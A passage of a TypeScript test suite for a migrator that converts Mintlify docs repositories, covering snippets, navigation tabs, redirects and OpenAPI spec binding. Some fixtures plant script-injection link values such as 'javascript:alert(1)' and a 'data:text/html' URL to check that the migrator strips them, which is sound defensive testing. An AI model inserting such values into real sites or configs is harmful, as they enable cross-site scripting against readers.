    expect(bundle.pages[0].body).toContain('Wrap a variable like \\{x\\} in braces.')
    // The frontmatter value must survive unescaped: it is YAML, not MDX.
    expect(bundle.pages[0].title).toBe('Style guide')
  })

  it('inlines a Mintlify <Snippet file="..."> tag form (no matching import needed)', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-mintlify-snippet-tag-'))
    mkdirSync(join(root, 'snippets'), { recursive: true })
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: { pages: ['setup'] },
    }))
    writeFileSync(join(root, 'setup.mdx'), '---\ntitle: Setup\n---\n\nFirst, <Snippet file="shared/warning.mdx" />\n\ndone.')
    mkdirSync(join(root, 'snippets', 'shared'), { recursive: true })
    writeFileSync(join(root, 'snippets', 'shared', 'warning.mdx'), 'back up your data')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    expect(bundle.pages[0].body).toContain('First, back up your data\n\ndone.')
  })

  it('leaves a comment and warns when a <Snippet file="..."> tag cannot be resolved', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-mintlify-snippet-tag-missing-'))
    mkdirSync(join(root, 'snippets'), { recursive: true })
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: { pages: ['setup'] },
    }))
    writeFileSync(join(root, 'setup.mdx'), '---\ntitle: Setup\n---\n\n<Snippet file="missing.mdx" />')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    expect(bundle.pages[0].body).toContain('Missing snippet: missing.mdx')
    expect(bundle.warnings).toContainEqual(expect.objectContaining({
      code: 'missing-page',
      message: expect.stringContaining('Snippet file="missing.mdx"'),
    }))
  })

  it('keeps a page when a missing snippet is used only inside an MDX comment', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-commented-snippet-'))
    writeFileSync(join(root, 'docs.json'), JSON.stringify({ navigation: { pages: ['sdk'] } }))
    writeFileSync(join(root, 'sdk.mdx'), [
      '---', 'title: SDK', '---', '',
      "import HiddenExample from '/snippets/missing.mdx'", '',
      '## Active docs', '', 'This page should remain available.', '',
      '{/* Disabled example:', '<HiddenExample />', '*/}',
    ].join('\n'))
    const result = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/example/docs' })
    expect(result.pages.map((page) => page.id)).toContain('sdk')
    expect(result.pages[0].body).toContain('<HiddenExample />')
    expect(result.warnings.some((warning) => warning.code === 'skipped-file')).toBe(false)
    expect(result.warnings.some((warning) => warning.code === 'missing-page')).toBe(false)
  })

  it('closes an incomplete imported code snippet before the next component', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-unclosed-snippet-'))
    mkdirSync(join(root, 'snippets'), { recursive: true })
    writeFileSync(join(root, 'docs.json'), JSON.stringify({ navigation: { pages: ['batch'] } }))
    writeFileSync(join(root, 'snippets', 'sample.mdx'), '```python Python\nprint("sample")\n')
    writeFileSync(join(root, 'batch.mdx'), [
      '---', 'title: Batch', '---', '',
      "import Sample from '/snippets/sample.mdx'", '',
      '<CodeGroup>', '', '<Sample />', '<Sample />', '', '</CodeGroup>',
    ].join('\n'))
    const result = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/example/docs' })
    expect(result.pages.map((page) => page.id)).toContain('batch')
    expect(result.pages[0].body.match(/```/g)).toHaveLength(4)
    expect(result.warnings.some((warning) => warning.code === 'skipped-file')).toBe(false)
  })

  it('maps a bare <Link href> to <a> and neutralizes any other unresolved component, with a warning', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-mintlify-unknown-components-'))
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: { pages: ['page'] },
    }))
    writeFileSync(join(root, 'page.mdx'), [
      '---', 'title: Page', '---', '',
      'See <Link href="/other">the other page</Link> for details.', '',
      '<Emoji name="tada" />',
    ].join('\n'))

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    const body = bundle.pages[0].body
    expect(body).toContain('<a href="/other">the other page</a>')
    // `<Emoji>` has no Thally builtin, import, or local declaration: the
    // generic unknown-component fallback drops the self-closing tag.
    expect(body).not.toContain('<Emoji')
    expect(bundle.warnings).toContainEqual(expect.objectContaining({
      code: 'unsupported-config',
      message: expect.stringContaining('<Emoji>'),
    }))
  })

  it('prefers a docs.json project root over a smaller mint.json one found first, and warns about the ambiguity (Infisical: company/mint.json vs docs/docs.json)', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-mintlify-multiroot-'))
    // `company` sorts before `docs` in a directory listing on most
    // filesystems, so a first-match breadth-first walk reaches it first.
    mkdirSync(join(root, 'company'), { recursive: true })
    writeFileSync(join(root, 'company', 'mint.json'), JSON.stringify({ navigation: { pages: ['handbook'] } }))
    writeFileSync(join(root, 'company', 'handbook.mdx'), '# Handbook')
    mkdirSync(join(root, 'docs'), { recursive: true })
    writeFileSync(join(root, 'docs', 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: { pages: ['introduction', 'guide'] },
    }))
    writeFileSync(join(root, 'docs', 'introduction.mdx'), '# Introduction')
    writeFileSync(join(root, 'docs', 'guide.mdx'), '# Guide')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    expect(bundle.pages.map((page) => page.id).sort()).toEqual(['guide', 'introduction'])
    expect(bundle.warnings).toContainEqual(expect.objectContaining({
      code: 'unsupported-config',
      message: expect.stringMatching(/Multiple possible Mintlify project roots.*company.*docs.*docs was picked/s),
    }))
  })

  it('does not warn about multiple roots when only one Mintlify project exists', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-mintlify-singleroot-'))
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: { pages: ['introduction'] },
    }))
    writeFileSync(join(root, 'introduction.mdx'), '# Introduction')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    expect(bundle.warnings.some((warning) => warning.message.includes('Multiple possible'))).toBe(false)
  })

  it('uses a nested Mintlify project as the config, content, snippet, and asset root', () => {
    const repositoryDir = mkdtempSync(join(tmpdir(), 'thally-migrate-mintlify-monorepo-'))
    const docsRoot = join(repositoryDir, 'apps', 'docs')
    mkdirSync(join(docsRoot, 'management'), { recursive: true })
    mkdirSync(join(docsRoot, 'guides'), { recursive: true })
    mkdirSync(join(docsRoot, 'images'), { recursive: true })
    mkdirSync(join(docsRoot, 'snippets'), { recursive: true })
    writeFileSync(join(docsRoot, 'navigation.json'), JSON.stringify({
      dropdowns: [{ dropdown: 'Discarded navigation', pages: ['discarded'] }],
    }))
    writeFileSync(join(docsRoot, 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      theme: 'maple',
      navigation: {
        $ref: './navigation.json',
        global: { anchors: [{ anchor: 'Community', href: 'https://community.example.com' }] },
        dropdowns: [
          {
            dropdown: 'Documentation',
            description: 'Resources for Acme developers',
            icon: 'book-open',
            groups: [{
              group: 'Getting started',
              icon: { name: 'play' },
              pages: ['introduction', { group: 'CLI', pages: ['manualSetup'] }],
            }],
          },
          {
            dropdown: 'API reference',
            groups: [{ group: 'Runs API', pages: ['management/runs'] }],
          },
          {
            dropdown: 'Guides & examples',
            groups: [{ group: 'Guides', pages: ['guides/introduction'] }],
          },
        ],
      },
      api: { openapi: 'service.openapi.yml' },
      redirects: [{ source: '/unsafe', destination: 'javascript:alert(1)' }],
      navbar: {
        links: [
          { label: 'Status', href: 'https://status.example.com' },
          { label: 'Unsafe', href: 'javascript:alert(1)' },
        ],
        primary: { type: 'github', href: 'https://github.com/acme/product' },
      },
      footer: {
        socials: {
          github: 'https://github.com/acme/product',
          unsafe: 'data:text/html,bad',
        },
        links: [{ header: 'Developers', items: [{ label: 'Changelog', href: '/changelog' }] }],
      },
    }))
    writeFileSync(join(docsRoot, 'introduction.mdx'), [
      '---',
      'title: Product docs',
      'sidebarTitle: Introduction',
      'tag: NEW',
      'mode: center',
      'noindex: true',
      '---',
      '',
      "import Shared from '/snippets/shared.mdx'",
      '',
      '<Shared tool={"CLI"} />',
    ].join('\n'))
    writeFileSync(join(docsRoot, 'manualSetup.mdx'), '---\ntitle: Manual setup\n---\n\n<Shared tool={"Setup"} />\n\n<SoftLimit />\n\n![Diagram](./images/setup.png?raw=1#preview)')
    writeFileSync(join(docsRoot, 'management', 'runs.mdx'), '---\ntitle: Runs\n---\n\nRuns API.')
    writeFileSync(join(docsRoot, 'guides', 'introduction.mdx'), '---\ntitle: Guides\n---\n\nGuides.')
    writeFileSync(join(docsRoot, 'snippets', 'shared.mdx'), 'Shared {tool} prerequisite.\n\n```tsx\nconst literal = {tool}\n```')
    writeFileSync(join(docsRoot, 'snippets', 'soft-limit.mdx'), 'This limit can be raised.')
    writeFileSync(join(docsRoot, 'logo.svg'), '<svg xmlns="http://www.w3.org/2000/svg"/>')
    writeFileSync(join(docsRoot, 'images', 'setup.png'), 'image')
    writeFileSync(join(docsRoot, 'service.openapi.yml'), 'openapi: 3.1.0\ninfo: { title: Service, version: 1.0.0 }\npaths: {}')

    const bundle = migrateRepository({
      repositoryDir,
      sourceUrl: 'https://github.com/acme/monorepo/tree/main/apps/docs',
      docsDir: 'apps/docs',
    })

    expect(bundle.platform).toBe('mintlify')
    expect(bundle.docsConfig.tabs.map((tab) => tab.tab)).toEqual([
      'Documentation',
      'API reference',
      'Guides & examples',
    ])
    expect(bundle.docsConfig.tabs[0].groups).toEqual([{
      group: 'Getting started',
      icon: 'play',
      pages: ['introduction', { group: 'CLI', pages: ['manualSetup'] }],
    }])
    expect(bundle.docsConfig.navigation).toEqual({
      display: 'dropdown',
      shortcuts: [{ label: 'Community', href: 'https://community.example.com' }],
    })
    expect(bundle.docsConfig.tabs[0]).toMatchObject({
      tab: 'Documentation',
      description: 'Resources for Acme developers',
      icon: 'book-open',
    })
    expect(bundle.docsConfig.tabs[1]).toMatchObject({
      tab: 'API reference',
      groups: [{ group: 'Runs API', pages: ['management/runs'] }],
      api: { source: 'openapi/service.openapi.yml', navigation: false },
    })
    expect(bundle.docsConfig).toMatchObject({
      theme: 'maple',
      navbar: {
        links: [
          { label: 'Status', href: 'https://status.example.com' },
          { label: 'Community', href: 'https://community.example.com' },
        ],
        primary: { label: 'GitHub', href: 'https://github.com/acme/product' },
      },
      footer: {
        socials: { github: 'https://github.com/acme/product' },
        links: [{ heading: 'Developers', items: [{ label: 'Changelog', href: '/changelog' }] }],
      },
      redirects: [
        { source: '/guides', destination: '/guides/introduction', permanent: false },
        { source: '/management', destination: '/management/runs', permanent: false },
        { source: '/', destination: '/introduction', permanent: true },
      ],
    })
    expect(bundle.pages.map((page) => page.id)).toEqual([
      'introduction',
      'manualSetup',
      'management/runs',
      'guides/introduction',
    ])
    expect(bundle.pages[0]).toMatchObject({
      navTitle: 'Introduction',
      badge: 'NEW',
      mode: 'center',
      noindex: true,
    })
    expect(bundle.pages[0].body).toContain('Shared CLI prerequisite.')
    expect(bundle.pages[0].body).toContain('const literal = {tool}')
    expect(bundle.pages[1].body).toContain('![Diagram](/images/setup.png?raw=1#preview)')
    expect(bundle.pages[1].body).toContain('Shared Setup prerequisite.')
    expect(bundle.pages[1].body).toContain('This limit can be raised.')
    expect(bundle.assets.map((asset) => asset.path)).toEqual(expect.arrayContaining([
      'logo.svg',
      'images/setup.png',
      'openapi/service.openapi.yml',
    ]))
    expect(withoutDashboardWarning(bundle.warnings)).toEqual([])

    // Specs must never land under public/, which the host serves verbatim.
    const renderedPaths = renderMigrationFiles(bundle).map((file) => file.path)
    expect(renderedPaths).toContain('openapi/service.openapi.yml')
    expect(renderedPaths).not.toContain('public/openapi/service.openapi.yml')
    expect(renderedPaths.some((path) => path.startsWith('public/') && /\.(ya?ml|json)$/.test(path))).toBe(false)

    const introduction = renderMigrationFiles(bundle)
      .find((file) => file.path === 'src/content/introduction.mdx')
    expect(introduction?.content).toContain('navTitle: "Introduction"')
    expect(introduction?.content).toContain('badge: "NEW"')
    expect(introduction?.content).toContain('mode: "center"')
    expect(introduction?.content).toContain('noindex: true')
  })

  it('binds a per-tab docs.json `openapi` (navigation.tabs[].openapi) to that exact tab, not just the top-level api.openapi', () => {
    const root = fixture()
    // `fixture()` already writes docs.json/pages elsewhere; write a minimal,
    // self-contained one here so the per-tab binding is unambiguous.
    const docsRoot = root
    writeFileSync(join(docsRoot, 'docs.json'), JSON.stringify({
      navigation: {
        tabs: [
          { tab: 'Guides', pages: ['guide'] },
          { tab: 'API Reference', openapi: 'openapi/service.yml', pages: ['api-landing'] },
        ],
      },
    }))
    mkdirSync(join(docsRoot, 'openapi'), { recursive: true })
    writeFileSync(join(docsRoot, 'guide.mdx'), '---\ntitle: Guide\n---\n\nGuide content.')
    writeFileSync(join(docsRoot, 'api-landing.mdx'), '---\ntitle: API\n---\n\nLanding.')
    writeFileSync(join(docsRoot, 'openapi', 'service.yml'), 'openapi: 3.1.0\ninfo: { title: Service, version: "1.0" }\npaths: {}')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    const apiTab = bundle.docsConfig.tabs.find((tab) => tab.tab === 'API Reference')
    expect(apiTab?.api).toEqual({ source: 'openapi/service.yml', navigation: false })
    expect(bundle.docsConfig.tabs.find((tab) => tab.tab === 'Guides')?.api).toBeUndefined()
    expect(bundle.assets.map((asset) => asset.path)).toContain('openapi/service.yml')
  })

  describe('tab menu API items', () => {
    const spec = 'openapi: 3.1.0\ninfo: { title: Service, version: "1.0" }\npaths: {}'
    const migrateMenu = (tabs: Array<Record<string, unknown>>, specs: Array<string> = ['openapi.json']) => {
      const root = fixture()
      writeFileSync(join(root, 'docs.json'), JSON.stringify({ navigation: { tabs } }))
      writeFileSync(join(root, 'guide.mdx'), '---\ntitle: Guide\n---\n\nGuide content.')
      for (const name of specs) writeFileSync(join(root, name), spec)
      return migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    }
    const summary = (bundle: ReturnType<typeof migrateRepository>) =>
      bundle.docsConfig.tabs.map((tab) => ({ tab: tab.tab, api: tab.api?.source, groups: tab.groups?.map((group) => group.group) }))

    it('keeps a Guide + API reference menu: the API item becomes a sibling tab bound to its spec with generated navigation', () => {
      const bundle = migrateMenu([{
        tab: 'Docs',
        menu: [{ item: 'Guide', pages: ['guide'] }, { item: 'API reference', openapi: 'openapi.json' }],
      }])
      expect(summary(bundle)).toEqual([
        { tab: 'Docs', api: undefined, groups: ['Guide'] },
        { tab: 'Docs: API reference', api: 'openapi/openapi.json', groups: undefined },
      ])
      expect(bundle.docsConfig.tabs[1].api).toEqual({ source: 'openapi/openapi.json' })
      expect(bundle.assets.map((asset) => asset.path)).toContain('openapi/openapi.json')
    })

    it('supports the { source, directory } object form and openapi + pages in one item', () => {
      const bundle = migrateMenu([{
        tab: 'Docs',
        menu: [
          { item: 'Guide', pages: ['guide'] },
          { item: 'Reference', openapi: { source: 'openapi.json', directory: 'api' }, pages: ['guide'] },
        ],
      }])
      expect(summary(bundle)).toEqual([
        { tab: 'Docs', api: undefined, groups: ['Guide', 'Reference'] },
        { tab: 'Docs: Reference', api: 'openapi/openapi.json', groups: undefined },
      ])
    })

    it('binds a sole API item to the tab itself, and keeps later tabs after the sibling', () => {
      const bundle = migrateMenu([
        { tab: 'API', menu: [{ item: 'Reference', openapi: 'openapi.json' }] },
        { tab: 'Docs', menu: [{ item: 'Guide', pages: ['guide'] }, { item: 'A', openapi: 'a.json' }] },
        { tab: 'More', pages: ['guide'] },
      ], ['openapi.json', 'a.json'])
      expect(summary(bundle).map((tab) => [tab.tab, tab.api])).toEqual([
        ['Docs', undefined],
        ['Docs: A', 'openapi/a.json'],
        ['More', undefined],
        ['API', 'openapi/openapi.json'],
      ])
    })

    it('gives two API items in one tab their own bindings, even for the same spec', () => {
      const bundle = migrateMenu([{
        tab: 'Docs',
        menu: [
          { item: 'Guide', pages: ['guide'] },
          { item: 'REST', openapi: 'openapi.json' },
          { item: 'Admin', openapi: 'admin.json' },
          { item: 'REST again', openapi: 'openapi.json' },
        ],
      }], ['openapi.json', 'admin.json'])
      expect(summary(bundle).map((tab) => [tab.tab, tab.api])).toEqual([
        ['Docs', undefined],
        ['Docs: REST', 'openapi/openapi.json'],
        ['Docs: Admin', 'openapi/admin.json'],
        ['Docs: REST again', 'openapi/openapi.json'],
      ])
    })

    it('carries a menu item icon and hidden flag onto its API tab', () => {
      const bundle = migrateMenu([{
        tab: 'Docs',
        menu: [
          { item: 'Guide', pages: ['guide'] },
          { item: 'Public', icon: 'code', openapi: 'openapi.json' },
          { item: 'Internal', hidden: true, openapi: 'a.json' },
        ],
      }], ['openapi.json', 'a.json'])
      expect(bundle.docsConfig.tabs.map((tab) => [tab.tab, tab.icon, tab.hidden])).toEqual([
        ['Docs', undefined, undefined],
        ['Docs: Public', 'code', undefined],
        ['Docs: Internal', undefined, true],
      ])
    })

    it('keeps same-named menu items under different versions bound to their own specs', () => {
      const root = fixture()
      writeFileSync(join(root, 'guide.mdx'), '---\ntitle: Guide\n---\n\nGuide content.')
      writeFileSync(join(root, 'v1.json'), spec)
      writeFileSync(join(root, 'v2.json'), `${spec}\n`)
      const menu = (file: string) => [{ item: 'Guide', pages: ['guide'] }, { item: 'REST', openapi: file }]
      writeFileSync(join(root, 'docs.json'), JSON.stringify({ navigation: { versions: [
        { version: 'v1', tabs: [{ tab: 'Docs', menu: menu('v1.json') }] },
        { version: 'v2', tabs: [{ tab: 'Docs', menu: menu('v2.json') }] },
      ] } }))
      const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
      expect(bundle.docsConfig.tabs.filter((tab) => tab.api).map((tab) => tab.api?.source).sort()).toEqual(['openapi/v1.json', 'openapi/v2.json'])
    })

    it('keeps two different specs with the same file name from different folders', () => {
      const root = fixture()
      mkdirSync(join(root, 'v1'))
      mkdirSync(join(root, 'v2'))
      writeFileSync(join(root, 'v1/openapi.json'), spec)
      writeFileSync(join(root, 'v2/openapi.json'), `${spec}\n# v2`)
      writeFileSync(join(root, 'guide.mdx'), '---\ntitle: Guide\n---\n\nGuide content.')
      writeFileSync(join(root, 'docs.json'), JSON.stringify({ navigation: { tabs: [
        { tab: 'V1', openapi: 'v1/openapi.json' },
        { tab: 'V2', openapi: 'v2/openapi.json' },
      ] } }))
      const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
      expect(bundle.docsConfig.tabs.flatMap((tab) => (tab.api ? [tab.api.source] : []))).toEqual(['openapi/openapi.json', 'openapi/v2-openapi.json'])
      expect(bundle.assets.map((asset) => asset.path).filter((path) => path.startsWith('openapi/')).sort()).toEqual(['openapi/openapi.json', 'openapi/v2-openapi.json'])
    })

    it('warns that a { source, directory } output folder scopes only part of the spec', () => {
      const bundle = migrateMenu([{
        tab: 'Docs',
        menu: [{ item: 'Guide', pages: ['guide'] }, { item: 'Ref', openapi: { source: 'openapi.json', directory: 'ref' } }],
      }])
      expect(bundle.warnings.map((warning) => warning.message).join('\n')).toContain('limited to pages under "ref"')
    })

    it('warns about an API menu item it cannot represent instead of dropping it silently', () => {
      const bundle = migrateMenu([{
        tab: 'Docs',
        menu: [{ item: 'Guide', pages: ['guide'] }, { item: 'Broken API', openapi: { directory: 'api' } }, { item: 'Async', asyncapi: 'openapi.json' }],
      }])
      const messages = bundle.warnings.map((warning) => warning.message).join('\n')
      expect(messages).toContain('"Broken API"')
      expect(messages).toContain('AsyncAPI is not supported')
    })
  })

  describe('API frontmatter', () => {
    function apiFixture(pages: Record<string, string>, docs: Record<string, unknown>) {
      const root = fixture()
      writeFileSync(join(root, 'docs.json'), JSON.stringify(docs))
      mkdirSync(join(root, 'specs'), { recursive: true })
      writeFileSync(join(root, 'openapi-a.json'), '{"openapi":"3.1.0","info":{"title":"A","version":"1"},"paths":{}}')
      writeFileSync(join(root, 'specs', 'openapi-b.yaml'), 'openapi: 3.1.0\ninfo: { title: B, version: "1" }\npaths: {}')
      writeFileSync(join(root, 'stray.yaml'), 'openapi: 3.1.0\ninfo: { title: S, version: "1" }\npaths: {}')
      for (const [name, body] of Object.entries(pages)) writeFileSync(join(root, `${name}.mdx`), body)
      return migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    }
    const twoSpecNav = {
      navigation: {
        tabs: [
          { tab: 'Guides', pages: ['plain', 'prefixed', 'quoted', 'abs', 'unknown', 'manual', 'bad'] },
          { tab: 'API A', openapi: 'openapi-a.json' },
          { tab: 'API B', openapi: 'specs/openapi-b.yaml' },
        ],
      },
      api: { mdx: { server: 'https://httpbin.org/', auth: { method: 'bearer' } } },
    }
    const pages = {
      plain: '---\ntitle: Plain\nopenapi: "POST /things"\n---\n',
      prefixed: '---\ntitle: Prefixed\nopenapi: "specs/openapi-b.yaml GET /widgets/{id}"\n---\n',
      quoted: '---\ntitle: Quoted\nopenapi: "\'./specs/openapi-b.yaml\' get /widgets/{id}"\n---\n',
      abs: '---\ntitle: Abs\nopenapi: "/openapi-a.json POST /things"\n---\n',
      unknown: '---\ntitle: Unknown\nopenapi: "missing.yaml GET /x"\n---\n',
      manual: '---\ntitle: Manual\napi: "POST https://httpbin.org/anything"\nauthMethod: Bearer\n---\n<ParamField body="a" type="string" />\n',
      bad: '---\ntitle: Bad\napi: [1, 2]\nauthMethod: oauth\n---\n',
    }

    it('rewrites spec prefixes to the migrated location and warns about unmigrated specs', () => {
      const bundle = apiFixture(pages, twoSpecNav)
      const openapi = (id: string) => bundle.pages.find((page) => page.id === id)?.openapi
      expect(openapi('plain')).toBe('POST /things')
      expect(openapi('prefixed')).toBe('openapi/openapi-b.yaml GET /widgets/{id}')
      expect(openapi('quoted')).toBe('openapi/openapi-b.yaml get /widgets/{id}')
      expect(openapi('abs')).toBe('openapi/openapi-a.json POST /things')
      expect(openapi('unknown')).toBe('missing.yaml GET /x')
      expect(bundle.warnings.some((w) => /"missing.yaml".*not migrated/.test(w.message))).toBe(true)
      expect(bundle.docsConfig.tabs.filter((tab) => tab.api).map((tab) => tab.api?.source)).toEqual(['openapi/openapi-a.json', 'openapi/openapi-b.yaml'])
    })

    it('keeps manual api and authMethod frontmatter and maps api.mdx', () => {
      const bundle = apiFixture(pages, twoSpecNav)
      const manual = bundle.pages.find((page) => page.id === 'manual')
      expect(manual).toMatchObject({ api: 'POST https://httpbin.org/anything', authMethod: 'bearer' })
      expect(bundle.docsConfig.api).toEqual({ mdx: { server: 'https://httpbin.org/', auth: { method: 'bearer' } }, specLink: false })
      const rendered = renderMigrationFiles(bundle).find((file) => file.path.endsWith('manual.mdx'))
      expect(String(rendered?.content)).toContain('api: "POST https://httpbin.org/anything"')
      expect(String(rendered?.content)).toContain('authMethod: "bearer"')
    })

    it('maps api.playground.display and the page-level playground frontmatter', () => {
      const bundle = apiFixture(
        {
          ...pages,
          quiet: '---\ntitle: Quiet\nopenapi: "POST /things"\nplayground: none\n---\n',
          gated: '---\ntitle: Gated\nopenapi: "POST /things"\nplayground: auth\n---\n',
          odd: '---\ntitle: Odd\nopenapi: "POST /things"\nplayground: fancy\n---\n',
        },
        { ...twoSpecNav, api: { mdx: twoSpecNav.api.mdx, playground: { display: 'simple' } } },
      )
      expect(bundle.docsConfig.api).toEqual({ mdx: { server: 'https://httpbin.org/', auth: { method: 'bearer' } }, playground: { display: 'simple' }, specLink: false })
      const page = (id: string) => bundle.pages.find((candidate) => candidate.id === id)
      expect(page('quiet')?.playground).toBe('none')
      // No viewer sign-in exists here, so Mintlify's "auth" shows no playground rather than showing it to everyone.
      expect(page('gated')?.playground).toBe('simple')
      expect(page('odd')?.playground).toBeUndefined()
      const rendered = renderMigrationFiles(bundle).find((file) => file.path.endsWith('quiet.mdx'))
      expect(String(rendered?.content)).toContain('playground: "none"')
      expect(bundle.warnings.map((w) => w.message).join('\n')).toContain('playground')
    })

    it('drops invalid api frontmatter and api.mdx values with warnings', () => {
      const bundle = apiFixture(pages, {
        ...twoSpecNav,
        api: { mdx: { server: ['javascript:alert(1)', 'https://ok.example.com'], auth: { method: 'key' } } },
      })
      const bad = bundle.pages.find((page) => page.id === 'bad')
      expect(bad?.api).toBeUndefined()
      expect(bad?.authMethod).toBeUndefined()
      expect(bundle.docsConfig.api).toEqual({ mdx: { server: ['https://ok.example.com'] }, specLink: false })
      const messages = bundle.warnings.map((w) => w.message).join('\n')
      expect(messages).toContain('"api" frontmatter')
      expect(messages).toContain('authMethod')
      expect(messages).toContain('javascript:alert(1)')
      expect(messages).toContain('api.mdx.auth')
    })

    describe('spec named by file stem', () => {
      const spec = (path: string) => `openapi: 3.1.0\ninfo: { title: T, version: "1" }\npaths:\n  ${path}:\n    post: { summary: S, responses: { '200': { description: ok } } }\n`
      const build = (files: Record<string, string>, docs: Record<string, unknown>) => {
        const root = mkdtempSync(join(tmpdir(), 'thally-migrate-stem-'))
        writeFileSync(join(root, 'docs.json'), JSON.stringify(docs))
        for (const [name, content] of Object.entries(files)) {
          mkdirSync(dirname(join(root, name)), { recursive: true })
          writeFileSync(join(root, name), content)
        }
        return migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs', platform: 'mintlify' })
      }
      const apiPage = (ref: string) => `---\ntitle: P\nopenapi: "${ref}"\n---\n`
      const openapiOf = (bundle: ReturnType<typeof build>, id: string) => bundle.pages.find((page) => page.id === id)?.openapi
      const messages = (bundle: ReturnType<typeof build>) => bundle.warnings.map((warning) => warning.message)
      const boundSources = (bundle: ReturnType<typeof build>) => bundle.docsConfig.tabs.flatMap((tab) => (tab.api ? [tab.api.source] : []))

      it('rewrites a stem, in any letter case, to the migrated spec like a file name or path', () => {
        const bundle = build({
          'openapi-a.json': '{"openapi":"3.1.0","info":{"title":"A","version":"1"},"paths":{}}',
          'specs/openapi-b.yaml': spec('/widgets'),
          'by-stem.mdx': apiPage('openapi-b POST /widgets'),
          'by-case.mdx': apiPage('OpenAPI-B post /widgets'),
          'by-name.mdx': apiPage('openapi-b.yaml POST /widgets'),
          'by-path.mdx': apiPage('specs/openapi-b.yaml POST /widgets'),
          'other.mdx': apiPage('./openapi-a POST /things'),
        }, { navigation: { tabs: [
          { tab: 'Guides', pages: ['by-stem', 'by-case', 'by-name', 'by-path', 'other'] },
          { tab: 'API A', openapi: 'openapi-a.json' },
          { tab: 'API B', openapi: 'specs/openapi-b.yaml' },
        ] } })
        expect(['by-stem', 'by-case', 'by-name', 'by-path'].map((id) => openapiOf(bundle, id))).toEqual([
          'openapi/openapi-b.yaml POST /widgets',
          'openapi/openapi-b.yaml post /widgets',
          'openapi/openapi-b.yaml POST /widgets',
          'openapi/openapi-b.yaml POST /widgets',
        ])
        expect(openapiOf(bundle, 'other')).toBe('openapi/openapi-a.json POST /things')
        expect(messages(bundle).filter((message) => /not migrated/.test(message))).toEqual([])
      })

      it('leaves a stem that names several specs as authored and lists the candidates', () => {
        const bundle = build({
          'a/openapi.yml': spec('/one'),
          'b/openapi.json': JSON.stringify({ openapi: '3.1.0', info: { title: 'B', version: '1' }, paths: { '/two': { post: { responses: { 200: { description: 'ok' } } } } } }),
          'both.mdx': apiPage('openapi POST /one'),
          'exact.mdx': apiPage('a/openapi.yml POST /one'),
        }, { navigation: { tabs: [
          { tab: 'Guides', pages: ['both', 'exact'] },
          { tab: 'API A', openapi: 'a/openapi.yml' },
          { tab: 'API B', openapi: 'b/openapi.json' },
        ] } })
        expect(openapiOf(bundle, 'both')).toBe('openapi POST /one')
        expect(openapiOf(bundle, 'exact')).toBe('openapi/openapi.yml POST /one')
        const ambiguous = messages(bundle).filter((message) => message.includes('"both"'))
        expect(ambiguous).toHaveLength(1)
        expect(ambiguous[0]).toContain('a/openapi.yml')
        expect(ambiguous[0]).toContain('b/openapi.json')
        expect(ambiguous[0]).toMatch(/full path/)
        expect(ambiguous[0]).not.toMatch(/not migrated/)
      })

      it('resolves a name against the source file names, not the names the specs were saved under', () => {
        const json = (path: string) => JSON.stringify({ openapi: '3.1.0', info: { title: 'T', version: '1' }, paths: { [path]: { post: { responses: { 200: { description: 'ok' } } } } } })
        const bundle = build({
          'a/spec.json': json('/one'),
          'b/spec.json': json('/two'),
          'both.mdx': apiPage('spec POST /one'),
          'exact.mdx': apiPage('b/spec.json POST /two'),
          'renamed.mdx': apiPage('b-spec POST /two'),
        }, { navigation: { tabs: [
          { tab: 'Guides', pages: ['both', 'exact', 'renamed'] },
          { tab: 'API A', openapi: 'a/spec.json' },
          { tab: 'API B', openapi: 'b/spec.json' },
        ] } })
        // `b/spec.json` is saved as `b-spec.json` to avoid a collision; the name `spec` still fits both sources.
        expect(boundSources(bundle).sort()).toEqual(['openapi/b-spec.json', 'openapi/spec.json'])
        expect(openapiOf(bundle, 'both')).toBe('spec POST /one')
        expect(openapiOf(bundle, 'exact')).toBe('openapi/b-spec.json POST /two')
        // The saved name is not a name the source ever had.
        expect(openapiOf(bundle, 'renamed')).toBe('b-spec POST /two')
        const ambiguous = messages(bundle).filter((message) => message.includes('"both"'))
        expect(ambiguous).toHaveLength(1)
        expect(ambiguous[0]).toContain('a/spec.json')
        expect(ambiguous[0]).toContain('b/spec.json')
        expect(messages(bundle).some((message) => message.includes('"renamed"') && /not migrated/.test(message))).toBe(true)
      })

      it('says several files match, not that none exists, when no declared spec resolves the stem', () => {
        const bundle = build({
          'a/openapi.yml': spec('/one'),
          'b/openapi.json': '{"openapi":"3.1.0","info":{"title":"B","version":"1"},"paths":{}}',
          'declared.yaml': spec('/two'),
